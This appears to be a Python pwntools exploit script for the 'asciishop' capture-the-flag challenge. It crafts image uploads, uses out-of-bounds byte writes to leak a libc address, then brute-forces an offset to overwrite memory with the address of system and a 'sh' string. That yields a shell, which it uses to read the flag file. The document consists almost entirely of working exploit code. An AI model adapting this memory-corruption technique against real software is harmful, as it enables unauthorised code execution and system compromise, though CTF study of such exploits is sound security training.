from pwn import *

for i in range(0,0x1000):
    local=1
    
    if local == 1:
        w = process("./asciishop")
    else:
        w = remote("challenges.fbctf.com",1340)
        
    sla = w.sendlineafter
    sl = w.sendline
    sa = w.sendafter
    ww = ELF("./libc-2.27.so")

    def upload(idd, image):
        sla(">>>","1")
        sla(":",idd)
        sa("ascii",image)

    def make(a1, a2, a3, cont):
        return "ASCI"+p32(a1)+p32(a2)+p32(a3)+cont.ljust(1024,"w")

    def touchup(idd):
        sla(">>>","4")
        sla(">>>","1")
        sla(":",idd)

    def change(pi,ch):
        sla(">>>","1")
        sla(":","("+str(pi)+",1) "+ch)

    def back():
        sla(">>>","4")

    def down(idd):
        sla(">>>","2")
        sla(":",idd)

    def exit():
        sla(">>>","5")

    upload("w",make(0x20,0x20,0x80000000,"wally"))
    upload("wa",make(0x20,0x20,0x30,"wally"))
    touchup("w")
    
    change(0x414-0x20,"\xff")
    change(0x414-0x20-3,"\xff")
    change(0x414-0x20-4,"\xff")

    back()
    back()

    down("wa")

    if local == 0:
        w.recvuntil("lib/x86_64-linux-gnu/libc.so.6\x00")
        libc = u64(w.recv(8))
    else :
        w.recvuntil("\x7f")
        for i in range(0,1000):
            leak = u64(w.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
            if leak&0xfff == 0x950:
                break
            libc = leak -0x97950

    one = [ 0x4f2c5, 0x4f322, 0x10a38c ]

    print hex(libc)

    one_g = p64(libc+ww.symbols['system'])
    touchup("w")

    off = 0x6f44+0x1000*i
    
    try:
        change(off-29,one_g[3])
        change(off-1-29,one_g[2])
        change(off-2-29,one_g[1])
        change(off-3-29,one_g[0])

        change(off-29-1528-3,"s")
        change(off-29-1528-2,"h")

        back()
        back()

        exit()

        w.sendline("cat /home/asciishop/flag")
        print w.recvline()
    except:
        continue
